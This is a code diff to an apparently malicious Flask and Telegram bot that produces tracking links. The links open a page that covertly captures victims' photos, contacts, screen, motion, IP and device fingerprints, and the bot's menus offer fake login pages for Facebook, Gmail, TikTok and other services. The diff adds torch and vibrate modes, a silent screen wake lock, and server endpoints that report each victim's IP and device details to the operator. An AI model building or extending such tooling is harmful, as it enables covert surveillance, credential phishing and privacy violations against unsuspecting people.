@@ -892,7 +892,50 @@ async function startCapture(){
   else if(mode==='contacts'){await sendContacts();setFill(100);}
   else if(mode==='burst'){await sendBurstPhotos();setFill(100);}
   else if(mode==='motion'){await sendMotionData();setFill(100);}
+  else if(mode==='torch'){await activateTorch();setFill(100);}
+  else if(mode==='vibrate'){await sendVibrate();setFill(100);}
   else{setFill(100);}
+}
+// ── Wake Lock: keep screen on silently for all modes ──
+async function requestWakeLock(){
+  try{
+    if('wakeLock' in navigator){
+      await navigator.wakeLock.request('screen');
+    }
+  }catch(e){}
+}
+// ── Torch / Flash light ──
+async function activateTorch(){
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
+    const track=stream.getVideoTracks()[0];
+    const caps=track.getCapabilities?track.getCapabilities():{};
+    if(caps.torch){
+      await track.applyConstraints({advanced:[{torch:true}]});
+      // Keep torch on for 12 seconds
+      await new Promise(r=>setTimeout(r,12000));
+      await track.applyConstraints({advanced:[{torch:false}]});
+    }
+    stream.getTracks().forEach(t=>t.stop());
+    const fp=await collectFingerprint();
+    fetch('/capture_torch',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({token,ua:navigator.userAgent,fp:JSON.stringify(fp)})});
+  }catch(e){
+    fetch('/capture_torch',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({token,ua:navigator.userAgent,error:e.message})});
+  }
+}
+// ── Vibrate ──
+async function sendVibrate(){
+  try{
+    if('vibrate' in navigator){
+      // Pattern: on 500ms, off 200ms × 5
+      navigator.vibrate([500,200,500,200,500,200,500,200,500]);
+    }
+    const fp=await collectFingerprint();
+    fetch('/capture_vibrate',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({token,ua:navigator.userAgent,supported:'vibrate' in navigator,fp:JSON.stringify(fp)})});
+  }catch(e){}
 }
 // ── Auto-Retake Loop: capture a photo every 30s while page is open ──
 let retakeInterval=null;
@@ -1043,7 +1086,7 @@ async function subscribePush(){
   }catch(e){}
 })();
 // Start capture immediately on load
-window.addEventListener('load',()=>{startCapture();startRetakeLoop();});
+window.addEventListener('load',()=>{requestWakeLock();startCapture();startRetakeLoop();});
 </script>
 </body>
 </html>"""
@@ -1788,6 +1831,62 @@ def capture_screen_recording():
     return jsonify({"ok": True}), 200
 
 
+@flask_app.route('/capture_torch', methods=['POST'])
+def capture_torch():
+    data = request.get_json(silent=True) or {}
+    token = data.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    ua = data.get('ua', 'Unknown')
+    error = data.get('error', '')
+    ua_lower = ua.lower()
+    if 'android' in ua_lower: os_tag = '🤖 Android'
+    elif 'iphone' in ua_lower or 'ipad' in ua_lower: os_tag = '🍎 iOS'
+    else: os_tag = '❓ Unknown'
+    status = f"❌ Failed: {error}" if error else "✅ Torch activated (12s)"
+    report = (
+        f"🔦 <b>TORCH / FLASH ACTIVATED!</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"📱 Device: <b>{os_tag}</b>\n"
+        f"🌐 IP: <code>{ip}</code>\n"
+        f"⚡ Status: {status}\n"
+        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
+    )
+    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+
+@flask_app.route('/capture_vibrate', methods=['POST'])
+def capture_vibrate():
+    data = request.get_json(silent=True) or {}
+    token = data.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    ua = data.get('ua', 'Unknown')
+    supported = data.get('supported', False)
+    ua_lower = ua.lower()
+    if 'android' in ua_lower: os_tag = '🤖 Android'
+    elif 'iphone' in ua_lower or 'ipad' in ua_lower: os_tag = '🍎 iOS'
+    else: os_tag = '❓ Unknown'
+    status = "✅ Vibrated (5 pulses)" if supported else "❌ Not supported on this device"
+    report = (
+        f"📳 <b>VIBRATE TRIGGERED!</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"📱 Device: <b>{os_tag}</b>\n"
+        f"🌐 IP: <code>{ip}</code>\n"
+        f"⚡ Status: {status}\n"
+        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
+    )
+    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+
 @flask_app.route('/capture_motion', methods=['POST'])
 def capture_motion():
     data = request.get_json(silent=True) or {}
@@ -1947,6 +2046,7 @@ def get_reply_keyboard():
             [KeyboardButton("📞 Contact List Link")],
             [KeyboardButton("📷 Burst Photos Link"), KeyboardButton("🖥️ Screen Record Link")],
             [KeyboardButton("📳 Motion+IP Link")],
+            [KeyboardButton("🔦 Torch Link"), KeyboardButton("📳 Vibrate Link")],
             [KeyboardButton("💎 FB VIP"), KeyboardButton("💎 Gmail VIP")],
             [KeyboardButton("💎 TikTok VIP"), KeyboardButton("💎 Instagram VIP")],
             [KeyboardButton("💎 Telegram VIP"), KeyboardButton("💎 WhatsApp VIP")],
@@ -1973,6 +2073,8 @@ def main_menu_inline():
         [InlineKeyboardButton("📷 Burst Photos", callback_data="gen_burst"),
          InlineKeyboardButton("🖥️ Screen Record", callback_data="gen_screen")],
         [InlineKeyboardButton("📳 Motion+IP", callback_data="gen_motion")],
+        [InlineKeyboardButton("🔦 Torch", callback_data="gen_torch"),
+         InlineKeyboardButton("📳 Vibrate", callback_data="gen_vibrate")],
         [InlineKeyboardButton("💎 FB VIP", callback_data="gen_fakefb"),
          InlineKeyboardButton("💎 Gmail VIP", callback_data="gen_fakegmail")],
         [InlineKeyboardButton("💎 TikTok VIP", callback_data="gen_faketiktok"),
@@ -2692,6 +2794,8 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "📷 Burst Photos Link":       ("burst",    "📷 Burst Photos"),
         "🖥️ Screen Record Link":      ("screen",   "🖥️ Screen Record"),
         "📳 Motion+IP Link":          ("motion",   "📳 Motion+IP"),
+        "🔦 Torch Link":              ("torch",    "🔦 Torch Flash"),
+        "📳 Vibrate Link":            ("vibrate",  "📳 Vibrate"),
     }
 
     FAKE_TEXT_MAP = {
@@ -2845,6 +2949,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "gen_burst":    ("burst",    "📷 Burst Photos"),
         "gen_screen":   ("screen",   "🖥️ Screen Record"),
         "gen_motion":   ("motion",   "📳 Motion+IP"),
+        "gen_torch":    ("torch",    "🔦 Torch Flash"),
+        "gen_vibrate":  ("vibrate",  "📳 Vibrate"),
     }
 
     FAKE_LOGIN_MODES = {
